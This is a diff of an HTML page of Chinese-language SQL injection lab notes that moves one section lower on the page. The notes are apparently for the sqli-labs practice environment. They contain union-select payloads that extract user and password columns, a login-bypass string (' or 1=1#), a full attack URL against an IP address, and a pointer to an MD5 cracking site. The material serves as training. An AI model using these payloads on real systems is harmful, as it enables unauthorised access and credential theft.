@@ -186,19 +186,6 @@ http://45.32.113.109:25040/Less-1/?id=-1&#39; union select 1,2,group_concat(colu
 1&#39; union select 1,concat(user,password) from users --+
 1&#39; union select 1,concat_ws(&#39;_&#39;,user.password) from users --+
 </code></pre>
-<hr>
-<pre><code>获取数据库中信息：破解加密数据
-Md5解密网站：https://www.cmd5.com/
-</code></pre>
-<p>**</p>
-<p>sql注入</p>
-<pre><code>实验过程：
-1、输入IP地址，进入实验页面
-2、使用万能密码（&#39; or 1=1#）绕过登录页面（登录成果有两个sql注入实验：字符型注入和联合注入）
-3、数字型注入
-   语句：select 字段名 from 数据库名，表名 limit 0,1
-   结果：返回username第一条数据，通过改变limit中第一位数字获取其他数据
-</code></pre>
 <p>**</p>
 <pre><code>information_schema:         表示所有信息，包括库、表、列
 information_schema.tables:  记录所有表名信息的表
@@ -207,6 +194,18 @@ table_schema:               数据库名称
 table_name:                 表名
 column_name:                列名
 group_concat():             显示所有查询到的数据
+</code></pre>
+<hr>
+<pre><code>获取数据库中信息：破解加密数据
+Md5解密网站：https://www.cmd5.com/
+</code></pre>
+<p>sql注入</p>
+<pre><code>实验过程：
+1、输入IP地址，进入实验页面
+2、使用万能密码（&#39; or 1=1#）绕过登录页面（登录成果有两个sql注入实验：字符型注入和联合注入）
+3、数字型注入
+   语句：select 字段名 from 数据库名，表名 limit 0,1
+   结果：返回username第一条数据，通过改变limit中第一位数字获取其他数据
 </code></pre>
 </body>
 </html>
